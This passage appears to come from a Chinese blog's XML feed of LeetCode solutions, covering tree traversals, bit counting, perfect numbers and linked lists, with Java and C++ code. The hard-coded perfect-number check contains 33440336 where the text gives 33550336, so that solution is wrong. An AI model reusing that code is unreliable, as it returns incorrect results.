<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>题目的意思就是找到最后一个非空格序列的长度，那么首先去掉首尾的空格，然后找到最后一个空格出现的索引。如果索引为-1，说明剩下的序列中没有空格，直接返回该序列的长度即可，否则，返回序列长度减去1减去索引的值就行。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == s || <span class="number">0</span> == s.trim().length()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s = s.trim();</span><br><span class="line">    <span class="keyword">int</span> index = s.lastIndexOf(<span class="string">' '</span>);</span><br><span class="line">    <span class="keyword">if</span> (-<span class="number">1</span> == index) &#123;</span><br><span class="line">        <span class="keyword">return</span> s.length();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.length() - <span class="number">1</span> - index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>414. 第三大的数</title>
    <url>/2018/09/04/LeetCode/leetcode-000414.%20%E7%AC%AC%E4%B8%89%E5%A4%A7%E7%9A%84%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非空数组，返回此数组中第三大的数。如果不存在，则返回数组中最大的数。要求算法时间复杂度必须是O(n)。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">输出: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">解释: 第三大的数是 <span class="number">1</span>.</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">输出: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">解释: 第三大的数不存在, 所以返回最大的数 <span class="number">2</span> .</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">输出: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">解释: 注意，要求返回第三大的数，是指第三大且唯一出现的数。</span><br><span class="line">存在两个值为<span class="number">2</span>的数，它们都排第二。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>用三个变量first, second, third来分别保存第一大，第二大，和第三大的数，然后我们遍历数组，如果遍历到的数字大于当前第一大的数first，那么三个变量各自错位赋值，如果当前数字大于second，小于first，那么就更新second和third，如果当前数字大于third，小于second，那就只更新third，注意这里有个坑，就是初始化要用长整型long的最小值，否则当数组中有Integer.MIN_VALUE存在时，程序就不知道该返回Integer.MIN_VALUE还是最大值first了</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">thirdMax</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> first = Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">long</span> second = Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">long</span> third = Long.MIN_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; first) &#123;</span><br><span class="line">            third = second;</span><br><span class="line">            second = first;</span><br><span class="line">            first = num;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; second &amp;&amp; num &lt; first) &#123;</span><br><span class="line">            third = second;</span><br><span class="line">            second = num;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; third &amp;&amp; num &lt; second) &#123;</span><br><span class="line">            third = num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>) ((Long.MIN_VALUE == third || second == third) ? first : third);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>507. 完美数</title>
    <url>/2018/09/04/LeetCode/leetcode-000507.%20%E5%AE%8C%E7%BE%8E%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>对于一个 正整数，如果它和除了它自身以外的所有正因子之和相等，我们称它为“完美数”。</p>
<p>给定一个 正整数 n， 如果他是完美数，返回 True，否则返回 False</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">28</span></span><br><span class="line">输出: True</span><br><span class="line">解释: <span class="number">28</span> = <span class="number">1</span> + <span class="number">2</span> + <span class="number">4</span> + <span class="number">7</span> + <span class="number">14</span></span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>输入的数字 n 不会超过 100,000,000. (1^e8)</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>因为题目将范围限制在了1亿以内，那么已知一亿以内的完美数有5个：6，28，496，8128，33550336。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPerfectNumber</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">6</span> == num || <span class="number">28</span> == num || <span class="number">496</span> == num || <span class="number">8128</span> == num || <span class="number">33440336</span> == num) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>暴力</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPerfectNumber</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == num) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; (<span class="keyword">int</span>)Math.sqrt(num) + <span class="number">1</span>;i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (num % i == <span class="number">0</span>) &#123;</span><br><span class="line">            sum += i + num / i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum == num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>589. N叉树的前序遍历</title>
    <url>/2018/09/04/LeetCode/leetcode-000589.%20N%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个N叉树，返回其节点值的前序遍历。<br>例如，给定一个 3叉树 :<br><img src="https://huhansi.github.io/images/2020-03-02-000559-NaryTreeExample.png" alt="3叉树"><br>返回其前序遍历: [1,3,5,6,2,4]。<br>说明: 递归法很简单，你可以使用迭代法完成此题吗?</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorder</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    result.add(root.val);</span><br><span class="line">    <span class="keyword">for</span> (Node node : root.children) &#123;</span><br><span class="line">        preorder(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>N叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>108. 将有序数组转换为二叉搜索树</title>
    <url>/2018/09/03/LeetCode/leetcode-000108.%20%E5%B0%86%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p>
<p>本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定有序数组: [-10,-3,0,5,9],</span><br><span class="line"></span><br><span class="line">一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</span><br><span class="line"></span><br><span class="line">      0</span><br><span class="line">     &#x2F; \</span><br><span class="line">   -3   9</span><br><span class="line">   &#x2F;   &#x2F;</span><br><span class="line"> -10  5</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>每次建左右子树的时候都用数组的中间元素作为根结点。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> binaryBuildBST(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> TreeNode <span class="title">binaryBuildBST</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (begin &gt; end) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">int</span> mid = (begin + end) / <span class="number">2</span>;</span><br><span class="line">    TreeNode root = <span class="keyword">new</span> TreeNode(nums[mid]);</span><br><span class="line">    root.left = binaryBuildBST(nums, begin, mid - <span class="number">1</span>);</span><br><span class="line">    root.right = binaryBuildBST(nums, mid + <span class="number">1</span>, end);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>338. 比特位计数</title>
    <url>/2018/09/03/LeetCode/leetcode-000338.%20%E6%AF%94%E7%89%B9%E4%BD%8D%E8%AE%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数 num。对于 0 ≤ i ≤ num 范围中的每个数字 i ，计算其二进制数中的 1 的数目并将它们作为数组返回。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 2</span><br><span class="line">输出: [0,1,1]</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: [0,1,1,2,1,2]</span><br></pre></td></tr></table></figure>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><ul>
<li>给出时间复杂度为O(n*sizeof(integer))的解答非常容易。但你可以在线性时间O(n)内用一趟扫描做到吗？</li>
<li>要求算法的空间复杂度为O(n)。</li>
<li>你能进一步完善解法吗？要求在C++或任何其他语言中不使用任何内置函数（如 C++ 中的 __builtin_popcount）来执行此操作。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>使用Java自带的库函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[num + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= num;i++) &#123;</span><br><span class="line">        result[i] = Integer.bitCount(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>位运算</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[num + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= num;i++) &#123;</span><br><span class="line">        result[i] = countBit(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">countBit</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (num != <span class="number">0</span>) &#123;</span><br><span class="line">        num = num &amp; (num - <span class="number">1</span>);</span><br><span class="line">        sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>559. N叉树的最大深度</title>
    <url>/2018/09/03/LeetCode/leetcode-000559.%20N%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个N叉树，找到其最大深度<br>最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。</p>
<p>例如，给定一个 <code>3叉树</code> :</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000559-NaryTreeExample.png" alt="3叉树"></p>
<p>我们应返回其最大深度，3。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><ul>
<li>树的深度不会超过 1000。</li>
<li>树的节点总不会超过 5000。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归，求每棵子树的最大深度</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> detph = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node child : root.children) &#123;</span><br><span class="line">        detph = Math.max(detph, maxDepth(child));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> detph + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>N叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>590. N叉树的后序遍历</title>
    <url>/2018/09/03/LeetCode/leetcode-000590.%20N%E5%8F%89%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个N叉树，返回其节点值的后序遍历。<br>例如，给定一个 <code>3叉树</code> :</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000559-NaryTreeExample.png" alt="3叉树"></p>
<p>返回其后序遍历: <code>[5,6,3,2,4,1]</code>.</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><p>递归法很简单，你可以使用迭代法完成此题吗?</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用递归</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorder</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Node child : root.children) &#123;</span><br><span class="line">            postorder(child);</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(root.val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>使用栈。在上图例子中，如果使用栈的话，就会得到[1, 4, 2, 3, 6, 5]，明显和结果不符，但是仔细观察就会发现，它其实就是结果的逆序。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorder</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    Stack&lt;Node&gt; s = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    s.push(root);</span><br><span class="line">    <span class="keyword">while</span> (!s.empty()) &#123;</span><br><span class="line">        Node node = s.pop();</span><br><span class="line">        result.add(node.val);</span><br><span class="line">        <span class="keyword">for</span> (Node temp : node.children) &#123;</span><br><span class="line">            s.push(temp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Collections.reverse(result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>N叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>762. 二进制表示中质数个计算置位</title>
    <url>/2018/09/03/LeetCode/leetcode-000762.%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E8%B4%A8%E6%95%B0%E4%B8%AA%E8%AE%A1%E7%AE%97%E7%BD%AE%E4%BD%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个整数 <code>L</code> 和 <code>R</code> ，找到闭区间 <code>[L, R]</code> 范围内，计算置位位数为质数的整数个数。</p>
<p>（注意，计算置位代表二进制表示中1的个数。例如 <code>21</code> 的二进制表示 <code>10101</code> 有 3 个计算置位。还有，1 不是质数。）</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: L &#x3D; 6, R &#x3D; 10</span><br><span class="line">输出: 4</span><br><span class="line">解释:</span><br><span class="line">6 -&gt; 110 (2 个计算置位，2 是质数)</span><br><span class="line">7 -&gt; 111 (3 个计算置位，3 是质数)</span><br><span class="line">9 -&gt; 1001 (2 个计算置位，2 是质数)</span><br><span class="line">10-&gt; 1010 (2 个计算置位，2 是质数)</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: L &#x3D; 10, R &#x3D; 15</span><br><span class="line">输出: 5</span><br><span class="line">解释:</span><br><span class="line">10 -&gt; 1010 (2 个计算置位, 2 是质数)</span><br><span class="line">11 -&gt; 1011 (3 个计算置位, 3 是质数)</span><br><span class="line">12 -&gt; 1100 (2 个计算置位, 2 是质数)</span><br><span class="line">13 -&gt; 1101 (3 个计算置位, 3 是质数)</span><br><span class="line">14 -&gt; 1110 (3 个计算置位, 3 是质数)</span><br><span class="line">15 -&gt; 1111 (4 个计算置位, 4 不是质数)</span><br></pre></td></tr></table></figure>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li><code>L</code>, <code>R</code> 是 <code>L &lt;= R</code> 且在 <code>[1, 10^6]</code> 中的整数。</li>
<li><code>R - L</code> 的最大值为 10000。<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3>10^6是小于2^20次方的，那就意味着问题可以转换为，在2的20次方之内，找到整数二进制数内数字1总数为质数的总数。<br>那问题就可以简化为，从L遍历到R，将整数转换为二进制，统计里面的1的个数，然后判断是否是20以内的质数，是总数加1，最后返回总数即可。</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countPrimeSetBits</span><span class="params">(<span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    HashSet&lt;Integer&gt; primes = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    primes.add(<span class="number">2</span>);</span><br><span class="line">    primes.add(<span class="number">3</span>);</span><br><span class="line">    primes.add(<span class="number">5</span>);</span><br><span class="line">    primes.add(<span class="number">7</span>);</span><br><span class="line">    primes.add(<span class="number">11</span>);</span><br><span class="line">    primes.add(<span class="number">13</span>);</span><br><span class="line">    primes.add(<span class="number">17</span>);</span><br><span class="line">    primes.add(<span class="number">19</span>);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = L;i &lt;= R;i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> value = Integer.bitCount(i);</span><br><span class="line">        <span class="keyword">if</span> (primes.contains(value)) &#123;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>876. 链表的中间结点</title>
    <url>/2018/09/03/LeetCode/leetcode-000876.%20%E9%93%BE%E8%A1%A8%E7%9A%84%E4%B8%AD%E9%97%B4%E7%BB%93%E7%82%B9/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个带有头结点 <code>head</code> 的非空单链表，返回链表的中间结点。</p>
<p>如果有两个中间结点，则返回第二个中间结点。</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,3,4,5]</span><br><span class="line">输出：此列表中的结点 3 (序列化形式：[3,4,5])</span><br><span class="line">返回的结点值为 3 。 (测评系统对该结点序列化表述是 [3,4,5])。</span><br><span class="line">注意，我们返回了一个 ListNode 类型的对象 ans，这样：</span><br><span class="line">ans.val &#x3D; 3, ans.next.val &#x3D; 4, ans.next.next.val &#x3D; 5, 以及 ans.next.next.next &#x3D; NULL.</span><br></pre></td></tr></table></figure>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[1,2,3,4,5,6]</span><br><span class="line">输出：此列表中的结点 4 (序列化形式：[4,5,6])</span><br><span class="line">由于该列表有两个中间结点，值分别为 3 和 4，我们返回第二个结点。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>给定链表的结点数介于 <code>1</code> 和 <code>100</code> 之间。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助外部数组，将链表的值存入数组，返回数组的中间位置元素即可。</p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">middleNode</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		ArrayList&lt;ListNode&gt; values = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != head) &#123;</span><br><span class="line">			values.add(head);</span><br><span class="line">			head = head.next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> values.get(values.size() / <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; A = &#123;head&#125;;</span><br><span class="line">        <span class="keyword">while</span> (A.back()-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">            A.push_back(A.back()-&gt;next);</span><br><span class="line">        <span class="keyword">return</span> A[A.<span class="built_in">size</span>() / <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用快慢双指针，快指针每次前进两步，慢指针每次前进一步，快指针到尾部之后，慢指针就到了中点。</p>
